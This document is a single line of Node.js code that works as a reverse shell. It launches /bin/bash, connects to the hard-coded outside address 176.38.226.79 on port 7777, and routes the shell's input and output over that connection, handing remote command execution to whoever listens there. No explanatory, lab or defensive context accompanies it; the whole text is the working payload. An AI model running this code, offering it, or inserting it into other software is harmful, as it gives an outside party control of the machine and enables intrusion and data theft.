var net = require("net"), sh = require("child_process").exec("/bin/bash");var client = new net.Socket();client.connect(7777, "176.38.226.79", function(){client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);});
